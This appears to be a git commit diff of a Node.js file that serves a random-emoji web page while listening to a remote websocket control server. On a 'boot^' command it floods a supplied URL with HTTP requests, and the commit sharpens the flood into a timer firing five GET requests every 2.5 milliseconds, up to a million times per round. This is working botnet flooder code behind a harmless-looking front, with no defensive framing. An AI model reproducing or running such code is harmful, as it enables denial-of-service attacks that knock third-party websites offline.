c685e5875ceb0c90ab75b0f1d782dbd7ba3b652f
1nchpp <76808801+1nchpp@users.noreply.github.com>
2021-06-02 23:43:29 -0500

    Update index.js

--- index.js
+++ index.js
@@ -8,7 +8,7 @@ var randFromArr = (arr) => {
 }
 app.get("/", async (req, res) => {
   var e = ''
-  for (i = 0; i < 800; i++) e+=randFromArr(emojis);
+  for (i = 0; i < 10; i++) e+=randFromArr(emojis);
   res.end(`<h1 style="font-size:10vw">${e}</h1>`)
 })
 
@@ -19,7 +19,6 @@ const socket = io("wss://server.iep0kjum6sity5e.repl.co", {
   reconnectionDelayMax: 100000,
 });
 
-
 socket.on('message', async m => {
   console.log(m)
   if (m.substr(0, 5) == "boot^") {
@@ -28,12 +27,18 @@ socket.on('message', async m => {
     var p = args[1]
     console.log("Booting: " + u + " with power: " + p)
     for (i = p; i > 0; i--) {
-      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.")})
-      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.")})
-      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.")})
-      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.")})
-      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.")})
+      var r = 0
+      var l
+      l = setInterval(()=>{
+      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.", u)})
+      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.", u)})
+      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.", u)})
+      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.", u)})
+      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.", u)})
       console.log(i)
+      r++
+      if (r == 1000000) clearInterval(l)
+      }, 2.5)
     }
   }
 })
